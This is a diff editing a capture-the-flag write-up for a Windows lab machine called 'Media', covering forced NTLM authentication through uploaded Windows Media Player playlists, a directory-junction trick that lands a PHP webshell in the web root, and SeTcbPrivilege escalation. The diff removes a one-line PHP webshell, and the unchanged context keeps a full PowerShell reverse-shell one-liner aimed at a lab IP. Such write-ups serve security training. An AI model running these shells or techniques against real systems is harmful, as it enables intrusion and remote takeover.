@@ -12,7 +12,7 @@
 
 ## Summary
 
-Media is a medium Windows machine hosting a job-application form that accepts a "video introduction" upload. The upload feature is built on old Windows Media Player playlist formats (`.wax`/`.asx`), which can be abused to force the server into making an outbound SMB request, leaking an NTLMv2 hash that is captured with Responder and cracked with hashcat, granting SSH access as `enox`. A backend script auto-opens every uploaded file in Windows Media Player, and as `enox` is possible to notice that the uploads land in `C:\Windows\Tasks\Uploads\<random>\`, a location separate from the actual web root (`C:\xampp\htdocs`). By deleting one of these upload folders and replacing it with a directory junction pointing at `htdocs`, a subsequent upload of a PHP webshell lands directly inside the website's document root, granting code execution as `nt authority\local service`. The shell is upgraded to a full Meterpreter session, and privilege escalation is achieved by abusing an unusual `SeTcbPrivilege` primitive to spawn a SYSTEM-level service that adds `enox` to the local Administrators group.
+Media is a medium Windows machine hosting a job-application form that accepts a "video introduction" upload. The upload feature is built on old Windows Media Player playlist formats (`.wax`/`.asx`), which can be abused to force the server into making an outbound SMB request, leaking an NTLMv2 hash that is captured with Responder and cracked with hashcat, granting SSH access as `enox`. A backend script auto-opens every uploaded file in Windows Media Player, and as `enox` is possible to notice that the uploads land in `C:\Windows\Tasks\Uploads\<random>\`, a location separate from the actual web root (`C:\xampp\htdocs`). By deleting one of these upload folders and replacing it with a directory junction pointing at `htdocs`, a new upload of a PHP webshell lands directly inside the website's document root, granting code execution as `nt authority\local service`. Privilege escalation is achieved by abusing a `SeTcbPrivilege` primitive to spawn a SYSTEM-level service that adds `enox` to the local Administrators group.
 
 ---
 
@@ -69,7 +69,7 @@ An upload feature that explicitly mentions Windows Media Player, rather than a n
 
 ## Foothold
 
-### Vulnerability — Forced NTLM Authentication via a Malicious Playlist File
+### Forced NTLM Authentication via a Malicious Playlist File
 
 A `.asx`/`.wax` file is just an XML playlist; the `<ref href="...">` tag can point anywhere, including a `file://` UNC path on an attacker-controlled host. If something on the server automatically opens the uploaded file in Windows Media Player, WMP will try to resolve that UNC path, causing the Windows host to authenticate over SMB to the attacker's machine, leaking the local service account's NTLMv2 hash in the process. This is the same class of attack popularized by tools like `ntlm_theft`, which generate several file types that trigger this kind of forced authentication (`.scf`, `.lnk`, `.url`, Office documents, and WMP playlists among them).
 
@@ -195,11 +195,11 @@ Directory of C:\Windows\Tasks\Uploads
 09/27/2026  03:50 AM    <DIR>          d41d8cd98f00b204e9800998ecf8427e
 ```
 
-This upload path is **not** the website's document root — the site itself is served from XAMPP's `C:\xampp\htdocs`, a completely separate directory. Since `review.ps1` only ever opens files with Windows Media Player, uploading a `.php` webshell through the form does nothing on its own; it just lands, unreachable, inside one of these random `Uploads` subfolders.
+This upload path is **not** the website's document root. The site itself is served from XAMPP's `C:\xampp\htdocs`, a completely separate directory. Since `review.ps1` only ever opens files with Windows Media Player, uploading a `.php` webshell through the form does nothing on its own; it just lands, unreachable, inside one of these random `Uploads` subfolders.
 
 ### Directory Junction Abuse
 
-`enox` has write access under `C:\Windows\Tasks\Uploads`, which means one of its subfolders can be deleted and replaced. On Windows, `mklink /J` creates a **directory junction**, effectively a symlink for folders: any application (including the upload handler) that later writes into that folder path is transparently redirected to wherever the junction actually points. By turning one of the upload subfolders into a junction that points at `C:\xampp\htdocs`, the next file uploaded to that same "random" folder is instead written straight into the website's web root, where PHP will happily execute it.
+`enox` has write access under `C:\Windows\Tasks\Uploads`, which means one of its subfolders can be deleted and replaced. On Windows, `mklink /J` creates a **directory junction**, effectively a symlink for folders: any application (including the upload handler) that later writes into that folder path is transparently redirected to wherever the junction actually points. By turning one of the upload subfolders into a junction that points at `C:\xampp\htdocs`, the next file uploaded to that same "random" folder is instead written straight into the website's web root, where PHP will execute it.
 
 ### Exploitation
 
@@ -214,11 +214,7 @@ Junction created for C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 <
 
 > The upload handler always reuses the same folder name for a given session/browser (hence the earlier `del`/`rmdir` on that exact folder), which is what makes it predictable enough to hijack.
 
-A minimal PHP webshell is then uploaded through the same web form used for the foothold:
-
-```php
-<?php system($_GET['cmd']); ?>
-```
+A PHP webshell is then uploaded through the same web form used for the foothold:
 
 ![](./screens/2.png)
 
@@ -241,6 +237,8 @@ A PowerShell reverse shell one-liner is sent through the webshell:
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.80',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+
+![](./screens/4.png)
 
 ```
 nc -lvnp 9001
